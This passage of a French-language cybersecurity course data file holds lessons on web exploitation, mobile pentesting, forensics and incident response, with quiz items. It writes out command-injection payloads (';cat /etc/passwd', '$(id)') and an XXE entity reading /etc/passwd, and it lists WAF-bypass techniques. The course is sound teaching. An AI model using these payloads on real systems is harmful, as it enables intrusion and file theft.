+df:"LFI -> RCE par log poisoning sur lab.",
+proj:"Write-up LFI sur GitHub.",
+q:[{q:"LFI :",a:["Fichier local","Fichier distant","Rien","SQL"],c:0,e:"Local File Inclusion."},{q:"Log poisoning :",a:["Injecter logs","Compresser","Rien","Hash"],c:0,e:"Payload dans logs."}]},
+
+{id:132,t:"Command injection",d:40,
+intro:"L'injection de commandes permet d'executer des commandes systeme via une entree mal filtree.",
+analogy:"Faire executer au serveur ce que vous voulez.",
+sections:[
+{titre:"Exemple",contenu:"<p><code>ping 127.0.0.1; cat /etc/passwd</code>. Ou <code>| whoami</code>, <code>$(id)</code>, <code>`id`</code>.</p>"},
+{titre:"Detection",contenu:"<p>Tester <code>;</code>, <code>|</code>, <code>&&</code>, <code>||</code>, <code>$()</code>, backticks. Comparer les temps de reponse (time-based).</p>"},
+{titre:"Defense",contenu:"<p>Ne JAMAIS passer d'entree utilisateur a un shell. Utiliser des libs qui echappent. Subprocess avec liste (pas shell=True).</p>"}
+],
+why:"RCE = controle total du serveur.",
+bank:"RCE sur serveur bancaire = compromission totale.",
+glo:"<b>RCE</b> : Remote Code Execution. <b>Shell=True</b> : dangereux.",
+pr:["DVWA Command Injection","Tester ;id","Tester |id","Blind time-based"],
+er:"Escaping shell est complexe. Eviter totalement.",
+df:"RCE sur DVWA + fix.",
+proj:"Write-up Command Injection sur GitHub.",
+q:[{q:"Injection :",a:[";id","Rien","--","Rien"],c:0,e:"Separateur de commande."},{q:"Defense :",a:["shell=True","eviter shell","blacklist","Rien"],c:1,e:"Jamais d'entree user au shell."}]},
+
+{id:133,t:"XXE (XML External Entity)",d:40,
+intro:"XXE exploite les parseurs XML mal configures pour lire des fichiers, faire du SSRF ou RCE.",
+analogy:"Faire dire au parseur XML : 'Va lire ce fichier'.",
+sections:[
+{titre:"Payload",contenu:"<p><code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code>.</p>"},
+{titre:"Impact",contenu:"<p>Lecture de fichiers, SSRF via <code>SYSTEM \"http://...\"</code>, DoS (billion laughs), parfois RCE via expect://.</p>"},
+{titre:"Defense",contenu:"<p>Desactiver les entites externes dans le parser XML (feature PHP : libxml_disable_entity_loader, Java : setFeature).</p>"}
+],
+why:"XXE = lecture de fichiers / SSRF via un simple POST XML.",
+bank:"API bancaires XML = cible XXE.",
+glo:"<b>DTD</b> : Definition de type XML. <b>Entity</b> : variable XML.",
+pr:["PortSwigger XXE lab","Tester file:///etc/passwd","Tester SSRF","Desactiver entites"],
+er:"Parser XML par defaut = souvent vulnerable.",
+df:"Exploiter XXE et proposer fix.",
+proj:"Write-up XXE sur GitHub.",
+q:[{q:"XXE lit :",a:["Fichiers","SQL","Session","Rien"],c:0,e:"Fichiers locaux."},{q:"Defense :",a:["Desactiver entites","WAF","Rien","Blacklist"],c:0,e:"Pas d'entites externes."}]},
+
+{id:134,t:"Deserialization attacks",d:45,
+intro:"Les attaques de deserialisation exploitent des libs qui instancient des objets a partir de donnees non fiables.",
+analogy:"Un colis qui s'auto-demonte en objet piege a l'arrivee.",
+sections:[
+{titre:"Plateformes touchees",contenu:"<ul><li><b>Java</b> : ObjectInputStream, ysoserial.</li><li><b>PHP</b> : unserialize(), PHPGGC.</li><li><b>Python</b> : pickle, PyYAML.</li><li><b>.NET</b> : BinaryFormatter, ysoserial.net.</li></ul>"},
+{titre:"Impact",contenu:"<p>Souvent RCE. Critique quand la lib a des gadgets chains.</p>"},
+{titre:"Defense",contenu:"<p>Ne jamais deserialiser d'entree non fiable. Formats surs (JSON). Signature des donnees serialisees.</p>"}
+],
+why:"RCE frequente dans les apps legacy.",
+bank:"Apps bancaires legacy Java = cible.",
+glo:"<b>Gadget</b> : classe exploitable. <b>Chain</b> : sequence de gadgets.",
+pr:["ysoserial","PHPGGC","Comprendre POP chains"],
+er:"Deserialiser JSON n'est pas toujours sur (prototype pollution JS).",
+df:"Etudier une gadget chain Java.",
+proj:"Write-up deserialisation Java sur GitHub.",
+q:[{q:"Java :",a:["ysoserial","Rien","curl","Rien"],c:0,e:"Outil deserialisation Java."},{q:"Defense :",a:["JSON","Deserialiser user","Rien","Blacklist"],c:0,e:"Formats surs uniquement."}]},
+
+{id:135,t:"Pentest API REST",d:50,
+intro:"Les APIs REST ont des vulnerabilites specifiques : IDOR, BOLA, mass assignment, rate limiting absent.",
+analogy:"Tester toutes les portes d'un immeuble, pas seulement la facade.",
+sections:[
+{titre:"Vulnerabilites API",contenu:"<ul><li><b>BOLA</b> : Broken Object Level Auth (= IDOR).</li><li><b>BFLA</b> : function level auth.</li><li><b>Mass assignment</b> : envoyer role=admin.</li><li><b>Rate limiting</b> : brute-force.</li><li><b>JWT flaws</b>.</li></ul>"},
+{titre:"Outils",contenu:"<p>Postman, Burp, ffuf sur APIs, Kiterunner, jwt_tool, Postwoman.</p>"},
+{titre:"Documentation",contenu:"<p>Swagger/OpenAPI souvent expose publiquement : /swagger.json, /api-docs.</p>"}
+],
+why:"APIs = coeur des apps modernes. Mal securisees = fuite massive.",
+bank:"APIs bancaires (mobile, partenaires) = cibles prioritaires.",
+glo:"<b>BOLA</b> : Broken Object Level Auth. <b>Mass assignment</b> : objet modifie entierement.",
+pr:["Postman sur API","Swagger enum","Tester mass assignment","jwt_tool"],
+er:"Fuzzer une API sans rate limit = DoS.",
+df:"Auditer une API lab (OWASP crAPI).",
+proj:"Rapport pentest API sur GitHub.",
+q:[{q:"BOLA =",a:["IDOR API","XSS","SQLi","Rien"],c:0,e:"Broken Object Level Auth."},{q:"Swagger :",a:["Doc API","Framework","Rien","Base"],c:0,e:"Doc API souvent exposee."}]},
+
+{id:136,t:"WAF : bypass et limites",d:40,
+intro:"Un WAF (Web Application Firewall) filtre les attaques web. Mal configure, il est contournable.",
+analogy:"Un filtre qui bloque les gros mots, mais contournable avec des synonymes.",
+sections:[
+{titre:"WAF populaires",contenu:"<p>Cloudflare, AWS WAF, ModSecurity, F5 ASM, Akamai.</p>"},
+{titre:"Bypass",contenu:"<ul><li>Encodage different (URL, Unicode, HTML).</li><li>Chunked transfer.</li><li>HTTP/2 smuggling.</li><li>Polymorphic payloads.</li><li>WAF bypass par JSON injection.</li></ul>"},
+{titre:"Limites",contenu:"<p>Un WAF ne corrige pas la faille. Il ralentit mais n'empeche pas les attaques ciblees. Defense en profondeur obligatoire.</p>"}
+],
+why:"Comprendre WAF = evaluer la defense reelle.",
+bank:"WAF bancaire = premiere couche. Ne jamais dependre uniquement de lui.",
+glo:"<b>WAF</b> : pare-feu applicatif. <b>Bypass</b> : contournement.",
+pr:["Identifier WAF (wafw00f)","Tester bypass encodage","Comparer avec/sans WAF"],
+er:"WAF seul = illusion de securite.",
+df:"Identifier et bypass un WAF sur lab autorise.",
+proj:"Comparatif WAF sur GitHub.",
+q:[{q:"WAF :",a:["Corrige","Filtre","Rien","Hash"],c:1,e:"Filtre, ne corrige pas."},{q:"Bypass :",a:["Encodage","Reboot","Rien","Rien"],c:0,e:"Variations d'encodage."}]},
+
+{id:137,t:"Pentest mobile (Android)",d:50,
+intro:"Les apps mobiles ont des vulnerabilites specifiques : stockage insecure, mauvaise crypto, endpoints caches, certificate pinning absent.",
+analogy:"Fouiller l'app dans son telephone.",
+sections:[
+{titre:"Outils",contenu:"<ul><li><b>MobSF</b> : analyse statique + dynamique.</li><li><b>apktool</b> : decompilation.</li><li><b>jadx</b> : code Java lisible.</li><li><b>Frida</b> : instrumentation.</li><li><b>Objection</b> : bypass SSL pinning.</li></ul>"},
+{titre:"Vulnerabilites",contenu:"<ul><li>Cle en dur dans l'APK.</li><li>Donnees sensibles en clair (SharedPreferences).</li><li>SSL pinning absent (MITM).</li><li>Endpoints non documentes.</li></ul>"},
+{titre:"Lab",contenu:"<p>DIVA, InsecureBankv2, OWASP MASTG.</p>"}
+],
+why:"Apps bancaires mobiles = cibles prioritaires.",
+bank:"Audit obligatoire des apps bancaires mobiles (BCEAO, PCI).",
+glo:"<b>APK</b> : paquet Android. <b>Frida</b> : instrumentation.",
+pr:["MobSF sur APK","jadx","Rechercher 'api_key'","Tester SSL pinning"],
+er:"Confondre obfuscation et securite.",
+df:"Analyser une app Android lab avec MobSF.",
+proj:"Rapport pentest Android sur GitHub.",
+q:[{q:"Apk decompilation :",a:["jadx","nmap","wireshark","Rien"],c:0,e:"jadx lit le bytecode."},{q:"SSL pinning bypass :",a:["Frida/Objection","curl","Rien","ping"],c:0,e:"Instrumentation runtime."}]},
+
+{id:138,t:"Pentest mobile (iOS)",d:45,
+intro:"iOS apps : architecture plus fermee mais vulnerabilites similaires (Keychain mal utilise, pinning absent).",
+analogy:"Fouiller l'app dans son iPhone.",
+sections:[
+{titre:"Outils",contenu:"<ul><li><b>MobSF</b> : analyse IPA.</li><li><b>class-dump</b>, <b>Hopper</b> : analyse binaire.</li><li><b>Frida</b> + <b>objection</b> : runtime.</li><li><b>Burp</b> avec certificat installe.</li></ul>"},
+{titre:"Vulnerabilites",contenu:"<ul><li>Keychain mal configure.</li><li>Pinning absent.</li><li>Jailbreak detection contournable.</li><li>Backup non chiffre.</li></ul>"},
+{titre:"Contraintes",contenu:"<p>iOS = jailbreak requis pour l'analyse dynamique poussee.</p>"}
+],
+why:"Apps bancaires iOS = cibles de choix.",
+bank:"Audit app iOS bancaire = obligatoire avant release.",
+glo:"<b>IPA</b> : paquet iOS. <b>Keychain</b> : stockage securise.",
+pr:["MobSF IPA","Frida","Burp certifi","Tester pinning"],
+er:"App store review ne garantit pas la securite.",
+df:"Analyser une app iOS lab avec MobSF.",
+proj:"Rapport pentest iOS sur GitHub.",
+q:[{q:"IPA :",a:["Android","iOS","Windows","Rien"],c:1,e:"Paquet iOS."},{q:"Keychain :",a:["Stockage","Rien","Hash","Rien"],c:0,e:"Stockage securise iOS."}]},
+
+{id:139,t:"Rapport de pentest",d:60,
+intro:"Un pentest sans rapport clair ne sert a rien. Le rapport doit etre lisible par les devs ET le management.",
+analogy:"Un diagnostic medical doit etre compris par le patient.",
+sections:[
+{titre:"Structure",contenu:"<ol><li>Executive summary (1 page, non technique).</li><li>Scope et methodologie.</li><li>Findings classes par criticite (CVSS).</li><li>Preuves (screenshots, payloads).</li><li>Recommandations priorisees.</li><li>Annexes.</li></ol>"},
+{titre:"CVSS",contenu:"<p>Score 0-10. Critical (9-10), High (7-9), Medium (4-7), Low (0-4). Calcul via first.org/cvss.</p>"},
+{titre:"Bonnes pratiques",contenu:"<p>Pas de jargon non explique. Reproductibilite des findings. Recommandations concretes.</p>"}
+],
+why:"Le rapport = livrable final du pentest.",
+bank:"Rapport pentest bancaire = document audit reglementaire.",
+glo:"<b>CVSS</b> : Common Vulnerability Scoring System.",
+pr:["Structurer un rapport","CVSS calculator","Prioriser findings","Faire relire"],
+er:"Rapport technique seul = inutile pour la direction.",
+df:"Rediger un rapport complet d'un lab.",
+proj:"Rapport pentest template sur GitHub.",
+q:[{q:"CVSS :",a:["Score","Format","Framework","Rien"],c:0,e:"Score 0-10 de criticite."},{q:"Executive summary :",a:["Non technique","Technique","Rien","Long"],c:0,e:"Resume pour direction."}]},
+
+{id:140,t:"Projet : pentest web complet",d:180,
+intro:"Auditer une application web de bout en bout (DVWA, PortSwigger, Juice Shop).",
+analogy:"Simulation d'attaque reelle.",
+sections:[
+{titre:"Etapes",contenu:"<ol><li>Recon (subdomains, tech stack).</li><li>Enum (ffuf, gobuster).</li><li>Scan vulns (Burp, Nikto).</li><li>Exploitation manuelle (SQLi, XSS, IDOR...).</li><li>Post-exploitation (si autorise).</li><li>Rapport.</li></ol>"},
+{titre:"Cible recommandee",contenu:"<p>OWASP Juice Shop : app complete avec 100+ challenges.</p>"},
+{titre:"Ethique",contenu:"<p>Scope ecrit. Pas de DoS. Pas d'exfiltration reelle. Rapport.</p>"}
+],
+why:"Projet concret = competence demontrable.",
+bank:"Simulation pentest bancaire.",
+glo:"<b>Recon</b> : reconnaissance. <b>Exploit</b> : attaque.",
+pr:["Juice Shop local","Burp","ffuf","Trouver 5 vulns","Rapport"],
+er:"Sans autorisation = illegal.",
+df:"Pentest complet de Juice Shop avec rapport.",
+proj:"Rapport pentest Juice Shop sur GitHub.",
+q:[{q:"Juice Shop :",a:["Lab","Banque","OS","Rien"],c:0,e:"Lab OWASP vulnerable."},{q:"Scope :",a:["Optionnel","Obligatoire","Rien","Long"],c:1,e:"Autorisation ecrite obligatoire."}]},
+
+/* ---------- MODULE 8 : FORENSICS & IR (141-160) ---------- */
+{id:141,t:"Introduction au forensics",d:40,
+intro:"Le forensics numerique analyse les preuves apres un incident pour comprendre et remedier.",
+analogy:"Enquete policiere sur une scene de crime numerique.",
+sections:[
+{titre:"Principes",contenu:"<ul><li><b>Preservation</b> : ne rien modifier.</li><li><b>Chaine de custody</b> : tracer chaque manipulation.</li><li><b>Hash</b> : prouver l'integrite.</li><li><b>Ordre de volatilite</b> : RAM > reseau > disque > backups.</li></ul>"},
+{titre:"Phases",contenu:"<ol><li>Identification.</li><li>Preservation.</li><li>Acquisition.</li><li>Analyse.</li><li>Rapport.</li></ol>"},
+{titre:"Outils",contenu:"<p>FTK Imager, dd, dcfldd, Volatility (RAM), Autopsy, Sleuthkit.</p>"}
+],
+why:"Sans forensics propre, impossible de comprendre l'attaque et de remedier.",
+bank:"Incident bancaire = forensics obligatoire pour la conformite.",
+glo:"<b>Chain of custody</b> : tracabilite. <b>Image</b> : copie bit a bit.",
+pr:["dd if=/dev/sda of=image.dd","sha256sum image.dd","Autopsy","Volatility"],
+er:"Travailler directement sur l'original = preuve detruite.",
+df:"Imager une cle USB et verifier le hash.",
+proj:"Rapport forensics d'un lab.",
+q:[{q:"Ordre volatilite :",a:["Disque puis RAM","RAM puis disque","Rien","Hasard"],c:1,e:"RAM d'abord (perdue a l'extinction)."},{q:"Hash :",a:["Integrite","Chiffrement","Rien","Compression"],c:0,e:"Prouve l'integrite."}]},
+
+{id:142,t:"Acquisition disque (dd)",d:35,
+intro:"Acquerir une image bit-a-bit du disque pour analyse, sans modifier l'original.",
+analogy:"Photocopie parfaite d'un document.",
+sections:[
+{titre:"Outils",contenu:"<ul><li><b>dd</b> : basique.</li><li><b>dcfldd</b> : + progression + hash.</li><li><b>FTK Imager</b> : GUI Windows.</li><li><b>Guymager</b> : rapide GUI.</li></ul>"},
+{titre:"Commande",contenu:"<p><code>sudo dcfldd if=/dev/sdb of=/mnt/evidence/sdb.dd hash=sha256 hashlog=sdb.hash</code>.</p>"},
+{titre:"Montage en lecture seule",contenu:"<p><code>sudo mount -o ro,loop,offset=... image.dd /mnt</code>.</p>"}
+],
+why:"Base de tout forensics disque.",
+bank:"Image du disque serveur compromis avant remediation.",
+glo:"<b>Image dd</b> : copie bit-a-bit. <b>RO</b> : read-only.",
+pr:["dcfldd d'une cle USB","Verifier hash","Monter en RO","Autopsy"],
+er:"Ecrire sur le disque original = preuve detruite.",
+df:"Imager une cle USB et verifier l'integrite.",
+proj:"Script d'acquisition automatise.",
+q:[{q:"dd :",a:["Image bit-a-bit","Compression","Hash","Rien"],c:0,e:"Copie brute."},{q:"Lecture seule :",a:["ro","rw","-","Rien"],c:0,e:"-o ro."}]},
+
+{id:143,t:"Analyse memoire (Volatility)",d:50,
+intro:"La RAM contient des artefacts critiques : processus, connexions, cles, MDP. Volatility les extrait.",
+analogy:"Fouiller dans la memoire vive du suspect.",
+sections:[
+{titre:"Volatility",contenu:"<p>Outil reference. Commandes : <code>imageinfo</code>, <code>pslist</code>, <code>pstree</code>, <code>netscan</code>, <code>cmdline</code>, <code>hashdump</code>.</p>"},
+{titre:"Acquisition RAM",contenu:"<p>Windows : <b>DumpIt</b>, <b>FTK Imager</b>. Linux : <b>LiME</b>. VMware : snapshot memoire.</p>"},
+{titre:"Artefacts cles",contenu:"<ul><li>Processus (pslist, pstree).</li><li>Connexions reseau.</li><li>Commandes executees.</li><li>MDP hashes (hashdump).</li><li>Malwares furtifs (fileless).</li></ul>"}
+],
+why:"RAM = seule chance de voir les malwares furtifs.",
+bank:"Un malware fileless sur serveur bancaire = visible uniquement en RAM.",
+glo:"<b>Fileless</b> : malware en RAM. <b>DumpIt</b> : acquisition Windows.",
+pr:["Acquerir RAM (DumpIt)","Volatility imageinfo","pslist","netscan"],
+er:"Redemarrer avant acquisition = RAM perdue.",
+df:"Analyser une image memoire avec Volatility.",
+proj:"Write-up analyse memoire sur GitHub.",
+q:[{q:"Volatility :",a:["RAM","Disque","Reseau","Rien"],c:0,e:"Outil d'analyse RAM."},{q:"DumpIt :",a:["Windows RAM","Linux","Disque","Rien"],c:0,e:"Acquisition RAM Windows."}]},
+
+{id:144,t:"Analyse timeline",d:40,
+intro:"Reconstituer la chronologie des evenements : creation fichier, execution, connexion, etc.",
+analogy:"Reconstitution d'un film image par image.",
+sections:[
+{titre:"Sources",contenu:"<ul><li>MFT (NTFS) : fichier creation/modif.</li><li>Event logs Windows.</li><li>Syslog Linux.</li><li>Browser history.</li><li>Prefetch, AmCache (Windows).</li></ul>"},
+{titre:"Outils",contenu:"<p><b>Plaso</b> (log2timeline), <b>Autopsy</b>, <b>Timesketch</b>, <b>mactime</b>.</p>"},
+{titre:"Sortie",contenu:"<p>Timeline unifiee CSV avec timestamp, source, evenement. Indispensable pour comprendre l'attaque.</p>"}
+],
+why:"Comprendre 'quand' et 'dans quel ordre' = comprendre 'comment'.",
+bank:"Timeline d'un incident bancaire = document audit.",
+glo:"<b>Timeline</b> : chronologie. <b>MFT</b> : Master File Table.",
+pr:["Plaso sur image","Timesketch","Voir chronologie"],
+er:"Ne pas unifier les timezones = timeline incoherente.",
+df:"Generer une timeline d'une VM test infectee.",
+proj:"Timeline sur GitHub.",
+q:[{q:"MFT :",a:["NTFS","RAM","Reseau","Rien"],c:0,e:"Table fichiers NTFS."},{q:"Plaso :",a:["Timeline","Antivirus","Rien","Scanner"],c:0,e:"Genere timeline."}]},
+
+{id:145,t:"Logs Windows : analyse",d:45,
+intro:"Windows Event Logs (EVTX) sont une mine d'or pour l'analyse d'incident.",
+analogy:"Journal detaille de tout ce qui se passe.",
+sections:[
+{titre:"Event IDs cles",contenu:"<ul><li><b>4624</b> : logon reussi (Type 3 = reseau, Type 10 = RDP).</li><li><b>4625</b> : logon echoue (brute-force).</li><li><b>4688</b> : processus cree.</li><li><b>4720</b> : compte cree.</li><li><b>7045</b> : service installe.</li><li><b>1102</b> : log efface (attaque).</li></ul>"},
+{titre:"Outils",contenu:"<p><b>Event Viewer</b> : GUI. <b>EvtxeCmd</b>, <b>Chainsaw</b>, <b>Hayabusa</b> : extraction et detection.</p>"},
+{titre:"Analyse",contenu:"<p>Chercher : brute-force (4625 x N), lateral movement (4624 type 3), persistence (7045), privilege escalation (4672).</p>"}
+],
+why:"Windows = cible principale. Logs = preuves.",
+bank:"Serveurs Windows bancaires = cible ransomware.",
+glo:"<b>EVTX</b> : format log Windows. <b>LOLBins</b> : binaires detournes.",
+pr:["Event Viewer","Filtrer 4625","Chainsaw sur logs","Identifier brute-force"],
+er:"Effacer les logs = 1102 = signe d'attaque.",
+df:"Analyser 1000 lignes de logs et identifier une attaque.",
+proj:"Cheatsheet Event IDs sur GitHub.",
+q:[{q:"Brute-force :",a:["4624","4625","4688","Rien"],c:1,e:"4625 = logon echoue."},{q:"Log efface :",a:["1102","4624","4720","Rien"],c:0,e:"1102 = clear log."}]},
+
+{id:146,t:"Logs Linux : analyse",d:40,
+intro:"Linux : /var/log/auth.log, syslog, journalctl, bash_history.",
+analogy:"Journal detaille du serveur.",
+sections:[
+{titre:"Fichiers cles",contenu:"<ul><li>/var/log/auth.log : SSH, sudo.</li><li>/var/log/syslog : systeme.</li><li>~/.bash_history : commandes user.</li><li>/var/log/apache2/ : web.</li><li>journalctl : systemd.</li></ul>"},
+{titre:"Detection",contenu:"<p>Chercher : failed password, invalid user, sudo commands, wget/curl suspects, cron modifications.</p>"},
+{titre:"Exemple",contenu:"<p><code>grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn</code> = top IPs attaquantes.</p>"}
+],
+why:"Serveurs Linux = cibles #1 brute-force SSH.",
+bank:"Serveurs bancaires Linux attaques via SSH = detection critique.",
+glo:"<b>auth.log</b> : logs auth. <b>journalctl</b> : logs systemd.",
+pr:["grep Failed password","awk uniq","journalctl -xe","bash_history"],
+er:"Bash_history peut etre efface par attaquant.",
+df:"Analyser auth.log et identifier top attaquants.",
+proj:"Script analyse auth.log.",
+q:[{q:"SSH logs :",a:["auth.log","syslog","Rien","Rien"],c:0,e:"Auth SSH dans auth.log."},{q:"Bash_history :",a:["Commandes","Auth","Rien","Rien"],c:0,e:"Historique commandes."}]},
+
+{id:147,t:"Malware analysis : statique",d:45,
+intro:"Analyser un malware sans l'executer : strings, hashes, imports, PE headers.",
+analogy:"Autopsie sans toucher au corps.",
+sections:[
+{titre:"Methodes",contenu:"<ul><li><b>Hash</b> : VirusTotal lookup.</li><li><b>Strings</b> : URLs, IPs, chemins.</li><li><b>PE analysis</b> : PEStudio, pefile.</li><li><b>Detection packer</b> : UPX, DIE.</li><li><b>Imports</b> : fonctions suspectes (VirtualAlloc, CreateRemoteThread).</li></ul>"},
+{titre:"Outils",contenu:"<p><b>strings</b>, <b>PEStudio</b>, <b>Detect It Easy</b>, <b>YARA</b>.</p>"},
+{titre:"Prudence",contenu:"<p>Ne jamais ouvrir un malware hors VM isolee.</p>"}
+],
+why:"Comprendre un malware = mieux detecter.",
+bank:"Malware bancaire (Emotet, Dridex, Trickbot) : analyse pour detection.",
+glo:"<b>PE</b> : Portable Executable. <b>Packer</b> : obfuscation.",
+pr:["strings suspect.exe","PEStudio","VirusTotal","DIE"],
+er:"Executer un malware hors sandbox = infection.",
+df:"Analyser statiquement un malware pedagogique.",
+proj:"Write-up malware sur GitHub.",
+q:[{q:"strings :",a:["Extrait texte","Execute","Compile","Rien"],c:0,e:"Texte lisible dans binaire."},{q:"Packer :",a:["Obfuscation","Antivirus","Rien","Compile"],c:0,e:"UPX etc."}]},
+
+{id:148,t:"Malware analysis : dynamique",d:55,
+intro:"Executer le malware dans un environnement isole (sandbox) pour observer son comportement.",
+analogy:"Mettre un suspect en observation.",
+sections:[
+{titre:"Outils",contenu:"<ul><li><b>VM isolee</b> : reseau host-only, snapshot.</li><li><b>Procmon</b> : processus.</li><li><b>Regshot</b> : diff registre.</li><li><b>Wireshark</b> : trafic reseau.</li><li><b>INetSim</b> : simuler internet.</li><li><b>Any.run</b>, <b>Hybrid Analysis</b> : sandbox en ligne.</li></ul>"},
+{titre:"Observer",contenu:"<ul><li>Fichiers crees.</li><li>Registre modifie.</li><li>Connexions reseau (C2).</li><li>Processus cree.</li><li>Persistence.</li></ul>"},
+{titre:"Network IOCs",contenu:"<p>IP/domaine C2, User-Agent, URL de beacon.</p>"}
+],
+why:"Observer en live = comprendre le malware en action.",
+bank:"Malware bancaire en sandbox pour comprendre les IOCs.",
+glo:"<b>C2</b> : Command & Control. <b>IOC</b> : Indicator of Compromise.",
+pr:["VM snapshot","Procmon","Wireshark","INetSim","Any.run"],
+er:"Internet en clair = fuite d'IP reelle.",
+df:"Analyser 1 malware pedagogique (EICAR-like).",
+proj:"Write-up malware dynamique sur GitHub.",
+q:[{q:"C2 :",a:["Serveur de controle","Antivirus","Rien","Hash"],c:0,e:"Command & Control."},{q:"Isolation :",a:["Host-only","Bridged","Public","Rien"],c:0,e:"Reseau isole."}]},
+
+{id:149,t:"Containment (confinement)",d:40,
+intro:"Premiere phase de la reponse : isoler la menace sans la detruire (pour forensics).",
+analogy:"Confiner un incendie sans detruire les preuves.",
+sections:[
+{titre:"Actions",contenu:"<ul><li>Isoler machine du reseau (mais pas eteindre).</li><li>Bloquer IP/domaine firewall.</li><li>Desactiver comptes compromis.</li><li>Resetter credentials.</li><li>Ne pas eteindre = RAM perdue.</li></ul>"},
+{titre:"Priorites",contenu:"<ol><li>Proteger vies / donnees sensibles.</li><li>Preserver preuves.</li><li>Arreter propagation.</li><li>Communiquer.</li></ol>"},
+{titre:"Coordination",contenu:"<p>Impliquer management, legal, communication, IT. Pas de decision unilaterale.</p>"}
+],
+why:"Un incident mal confine = perte totale.",
+bank:"Incident bancaire = plan de crise. Containment = priorite 1.",
+glo:"<b>Containment</b> : confinement. <b>Eradication</b> : suppression.",
+pr:["Simuler containment VM isolee","Bloquer IP","Tracer actions"],
+er:"Eteindre la machine = RAM perdue.",
+df:"Plan de containment pour un ransomware.",
+proj:"Playbook containment sur GitHub.",
+q:[{q:"1er :",a:["Eteindre","Isoler reseau","Rien","Formater"],c:1,e:"Isoler sans detruire."},{q:"Ne pas :",a:["Eteindre","Isoler","Bloquer","Communiquer"],c:0,e:"Eteindre = RAM perdue."}]},
+
+{id:150,t:"Eradication et recovery",d:45,
+intro:"Supprimer la menace et restaurer un etat sain. Reinstaller est souvent necessaire.",
+analogy:"Desinfection complete puis reconstruction.",
+sections:[
+{titre:"Eradication",contenu:"<ul><li>Reinstaller OS depuis image saine.</li><li>Changer tous les MDP.</li><li>Revoquer tous les tokens.</li><li>Patcher les vulnerabilites exploitees.</li><li>Ne jamais 'nettoyer' un OS compromis.</li></ul>"},
+{titre:"Recovery",contenu:"<ul><li>Restaurer depuis backup verifiee.</li><li>Verifier integrite.</li><li>Monitoring renforce pendant 30j.</li><li>Retour progressif en prod.</li></ul>"},
+{titre:"Post-incident",contenu:"<p>Retour d'experience. Actions correctives. Mise a jour du plan de reponse.</p>"}
+],
+why:"Un systeme compromis ne redevient jamais 'sur' sans reinstallation.",
+bank:"Retour en prod apres incident = validation direction + securite.",
+glo:"<b>Eradication</b> : suppression. <b>Recovery</b> : restauration.",
+pr:["Reinstaller VM test","Restaurer backup","Monitoring"],
+er:"Nettoyer un malware = illusion. Reinstallez.",
+df:"Plan d'eradication pour un ransomware.",
+proj:"Playbook eradication/recovery sur GitHub.",
+q:[{q:"Systeme compromis :",a:["Nettoyer","Reinstaller","Rien","Reboot"],c:1,e:"Reinstallation obligatoire."},{q:"Backup :",a:["Verifiee","Rien","Optionnelle","Rien"],c:0,e:"Tester integrite."}]},
+
+{id:151,t:"Chain of custody et preuves",d:35,
+intro:"La chaine de custody trace toutes les manipulations des preuves pour garantir leur recevabilite legale.",
+analogy:"Un sceau de police sur chaque preuve.",
+sections:[
+{titre:"Documentation",contenu:"<ul><li>Qui a collecte.</li><li>Quand.</li><li>Ou.</li><li>Comment.</li><li>Hash de l'image.</li><li>Qui a accede apres.</li></ul>"},
+{titre:"Recommandations",contenu:"<ul><li>Formulaire standard.</li><li>Stockage securise.</li><li>Acces limite.</li><li>Double copies.</li></ul>"},
+{titre:"Legal",contenu:"<p>Preuve non tracee = irrecevable en justice.</p>"}
+],
+why:"Preuve non tracee = inutilisable en justice.",
+bank:"Incident bancaire = souvent poursuites judiciaires.",
+glo:"<b>Chain of custody</b> : tracabilite preuves.",
+pr:["Template CoC","Hash","Acces limite"],
+er:"Modifier un fichier preuve = irrecevable.",
+df:"Rediger un formulaire chain of custody.",
+proj:"Template CoC sur GitHub.",
+q:[{q:"CoC :",a:["Tracabilite","Chiffrement","Rien","Hash"],c:0,e:"Trace manipulations."},{q:"Preuve non tracee :",a:["Recevable","Irrecevable","Rien","Utile"],c:1,e:"Inadmissible en justice."}]},
+
+{id:152,t:"Ransomware : comprendre",d:45,
+intro:"Le ransomware chiffre les donnees et exige une rancon. Comprendre son mode operatoire = mieux se proteger.",
+analogy:"Prendre en otage vos fichiers.",
+sections:[
+{titre:"Kill chain typique",contenu:"<ol><li>Phishing / RDP expose.</li><li>Execution (macro, exploit).</li><li>Persistence (service, scheduled task).</li><li>Escalade privileges.</li><li>Lateral movement (PsExec, WMI).</li><li>Exfiltration donnees (double extorsion).</li><li>Chiffrement.</li><li>Rancon.</li></ol>"},
+{titre:"Familles celebres",contenu:"<p>WannaCry, Ryuk, Conti, LockBit, BlackCat/ALPHV, Cl0p.</p>"},
+{titre:"Defense",contenu:"<ul><li>Backups hors ligne testes.</li><li>Segmentation reseau.</li><li>MFA obligatoire.</li><li>EDR.</li><li>Detection comportementale.</li></ul>"}
+],
+why:"Ransomware = menace #1 pour les banques.",
+bank:"Une banque touchee = paralysie + rancon + amendes.",
+glo:"<b>Double extorsion</b> : chiffrement + fuite. <b>EDR</b> : detection endpoint.",
+pr:["Analyser une souche (Any.run)","Backups 3-2-1","Test restore"],
+er:"Payer la rancon = encourage les attaques.",
+df:"Plan anti-ransomware pour une banque.",
+proj:"Plan anti-ransomware sur GitHub.",
+q:[{q:"Ransomware :",a:["Chiffre","Supprime","Rien","Vide"],c:0,e:"Chiffrement + rancon."},{q:"Defense cle :",a:["Backups","Rien","Reboot","Antivirus seul"],c:0,e:"Backups hors ligne."}]},
+
+{id:153,t:"Phishing : analyse",d:40,
+intro:"Le phishing reste vecteur #1 d'infection. Analyser un mail suspect : header, liens, attachments.",
+analogy:"Enqueter sur une lettre suspecte.",
+sections:[
+{titre:"Analyse header",contenu:"<ul><li><b>From</b> : peut etre usurpe.</li><li><b>Return-Path</b>, <b>Reply-To</b> : souvent differents.</li><li><b>Received</b> : chemin du mail.</li><li><b>SPF/DKIM/DMARC</b> : verification.</li></ul>"},
+{titre:"Liens",contenu:"<p>Survoler (pas cliquer). Verifier redirections (URL unshortener). URLs typosquatting (paypa1.com).</p>"},
+{titre:"Attachments",contenu:"<p>Fichiers dangereux : .exe, .scr, .js, .lnk, .docm, .xlsm, archives protegees.</p>"}
+],
+why:"Phishing = vecteur #1 d'infection.",
+bank:"Phishing bancaire = vol de credentials clients.",
